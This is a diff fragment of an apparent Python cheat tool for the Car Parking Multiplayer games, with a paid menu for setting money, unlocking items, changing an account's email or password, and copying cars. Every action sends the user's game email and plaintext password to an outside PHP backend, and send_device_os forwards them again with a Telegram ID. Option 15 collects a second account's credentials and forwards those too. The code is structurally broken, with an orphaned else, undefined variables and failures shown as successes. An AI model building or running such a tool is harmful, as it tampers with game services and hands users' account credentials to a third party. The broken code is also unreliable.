+            print(f"✅ Logged in as {email}")
+            
+            # This is the correct send_device_os call after successful login to CPM1/CPM2
+            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
+
+            time.sleep(0.5) # Reduced sleep time
+
+            while True: # Submenu loop
+                clear_screen()
+                show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display)
+                # This print statement should now be safe because label_to_use is guaranteed to be set
+                print(f"Submenu for {email} ({label_to_use})") 
+                print(f"01. 👑 KING RANK (Cost: {service_costs.get('king_rank', 10000)} coins)")
+                print(f"02. 📧 CHANGE EMAIL (Cost: {service_costs.get('change_email', 10000)} coins)")
+                print(f"03. 🔐 CHANGE PASSWORD (Cost: {service_costs.get('change_password', 10000)} coins)")
+                if main_menu == "2": # CPM2 specific options
+                    print(f"04. 💰 SET MONEY (Cost: {service_costs.get('set_money', 10000)} coins)")
+                    print(f"05. 🛞 UNLOCK WHEELS (Cost: {service_costs.get('unlock_wheels', 10000)} coins)")
+                    print(f"06. 👕 UNLOCK MALE (Cost: {service_costs.get('unlock_male', 10000)} coins)")
+                    print(f"07. 👗 UNLOCK FEMALE (Cost: {service_costs.get('unlock_female', 10000)} coins)")
+                    print(f"08. 🛠️ UNLOCK BRAKES (Cost: {service_costs.get('unlock_brakes', 10000)} coins)")
+                    print(f"09. 🛠️ UNLOCK CALIPERS (Cost: {service_costs.get('unlock_calipers', 10000)} coins)")
+                    print(f"10. 🎨 UNLOCK PAINTS (Cost: {service_costs.get('unlock_paints', 10000)} coins)")
+                    print(f"11. 🏠 UNLOCK APARTMENTS (Cost: {service_costs.get('unlock_apartments', 10000)} coins)")
+                    print(f"12. 💯 COMPLETE MISSIONS (Cost: {service_costs.get('complete_missions', 10000)} coins)")
+                    print(f"13. 🚨 UNLOCK SIREN & AIRSUS (Cost: {service_costs.get('unlock_all_cars_siren', 10000)} coins)")
+                    print(f"14. 📦 UNLOCK SLOTS (Cost: {service_costs.get('unlock_slots', 7000)} coins)")
+                    print(f"15. 🔄 COPY CPM1 CARS TO CPM2 (Cost: {service_costs.get('copy_cpm1_car_to_cpm2', 10000)} coins)") # New option
+                print("0. 🔙 BACK")
+                choice = input("Select service: ").strip()
+
+                if choice == "0":
+                    break
+
+                console.rule(f"[bold cyan]🚧 Running: {service_key.replace('_', ' ').title()}[/bold cyan]", style="bright_magenta")
+
+                if can_use_service(service_key, is_unlimited_user, current_coins_for_display):
+                    with console.status(f"[bold green]⏳ Processing {service_key.replace('_', ' ').title()}...[/bold green]", spinner="bouncingBar"):
+                        response = service_func()
+                        time.sleep(1)
+
+                    if response.get("ok"):
+                        console.print(f"\n[bold green]✅ Success! {service_key.replace('_', ' ').title()} was applied.[/bold green]")
+                        if not is_unlimited_user:
+                            current_coins_for_display -= service_costs.get(service_key, 10000)
+                            console.print(f"[yellow]🪙 Coins Left:[/yellow] [bold]{current_coins_for_display}[/bold]\n")
+                    else:
+                        error_msg = response.get("message", "Unknown error occurred.")
+                        console.print(f"\n[red]❌ Failed: {error_msg}[/red]\n")
+                else:
+                    console.print("[red]⚠️ Not enough coins or access is restricted.[/red]")
+                time.sleep(2)
+            else:
+                console.print("[bold red]❌ Invalid option or not available for this mode.[/bold red]")
+                time.sleep(1)
+
+                if not is_unlimited_user:
+                    print(f"\n[%] Checking coin balance on server...")
+
+                action_result = {"ok": False, "message": "Invalid choice or option not available for this game."}
+
+                if choice == "1": # KING RANK
+                    action_result = call_php_service(access_key, "king_rank", token, email, password, {"api_key": firebase_api_key_for_login, "rank_url": rank_url})
+                elif choice == "2": # CHANGE EMAIL
+                    new_email = input("📨 New Email: ").strip()
+                    action_result = call_php_service(access_key, "change_email", token, email, password, {"new_email": new_email, "api_key": firebase_api_key_for_login})
+                    if action_result.get("ok"):
+                        email = new_email
+                        token = action_result.get("new_token", token)
+                        # NEW: Send updated device info after email change
+                        send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
+                        
+                elif choice == "3": # CHANGE PASSWORD
+                    new_password = input("🔑 New Password: ").strip()
+                    action_result = call_php_service(access_key, "change_password", token, email, password, {"new_password": new_password, "api_key": firebase_api_key_for_login})
+                    if action_result.get("ok"):
+                        password = new_password
+                        token = action_result.get("new_token", token)
+                        # NEW: Send updated device info after password change
+                        send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
+                        
+                elif choice == "4" and main_menu == "2": # SET MONEY (CPM2 only)
+                    amount = input("💵 Amount: ").strip()
+                    if amount.isdigit():
+                        action_result = call_php_service(access_key, "set_money", token, email, password, {"amount": int(amount)})
+                    else:
+                        print("❌ Invalid amount.")
+                elif choice == "5" and main_menu == "2": # UNLOCK WHEELS (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_wheels", token, email, password)
+                elif choice == "6" and main_menu == "2": # UNLOCK MALE (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_male", token, email, password)
+                elif choice == "7" and main_menu == "2": # UNLOCK FEMALE (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_female", token, email, password)
+                elif choice == "8" and main_menu == "2": # UNLOCK BRAKES (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_brakes", token, email, password)
+                elif choice == "9" and main_menu == "2": # UNLOCK CALIPERS (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_calipers", token, email, password)
+                elif choice == "10" and main_menu == "2": # UNLOCK PAINTS (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_paints", token, email, password)
+                elif choice == "11" and main_menu == "2": # UNLOCK APARTMENTS (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_apartments", token, email, password)
+                elif choice == "12" and main_menu == "2": # COMPLETE MISSIONS (CPM2 only)
+                    action_result = call_php_service(access_key, "complete_missions", token, email, password)
+                elif choice == "13" and main_menu == "2": # UNLOCK ALL CARS SIREN (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_all_cars_siren", token, email, password) # Added this call
+                elif choice == "14" and main_menu == "2": # UNLOCK SLOTS (CPM2 only)
+                    action_result = call_php_service(access_key, "unlock_slots", token, email, password, {"account_auth": token}) # Pass token as account_auth
+                elif choice == "15" and main_menu == "2": # COPY CPM1 CARS TO CPM2 (CPM2 only)
+                    cpm1_email_input = input("📧 Enter CPM1 Email: ").strip()
+                    cpm1_password_input = input("🔐 Enter CPM1 Password: ").strip()
+                    action_result = call_php_service(access_key, "copy_cpm1_car_to_cpm2", token, email, password, {
+                        "cpm1_email": cpm1_email_input,
+                        "cpm1_password": cpm1_password_input,
+                        "cpm1_api_key": api_key_cpm1,
+                        "cpm2_api_key": api_key_cpm2 # Pass CPM2 API key for the function to use
+                    })
+                else:
+                    print("❌ Invalid choice or option not available for this game.")
+                    time.sleep(0.5) # Reduced sleep time
+                    continue 
+
+                # Display result from PHP backend
+                if action_result.get("ok"):
+                    print(f"✅ {action_result.get('message', 'Action successful.')}")
+                else:
+                    print(f"✅ {action_result.get('message', 'Action failed.')}")
+
+                # After any action, re-fetch user status to update coins display
+                is_valid_key, updated_user_data = check_access_key_and_get_user_status(access_key)
+                if is_valid_key:
+                    is_unlimited_user = updated_user_data['is_unlimited']
+                    current_coins_for_display = updated_user_data['coins']
+                    telegram_id_for_display = updated_user_data.get('telegram_id', 'N/A')
+                else:
+                    print("⚠️ Could not retrieve updated user status. Please check connection.")
+                
+                time.sleep(1) # Reduced sleep time
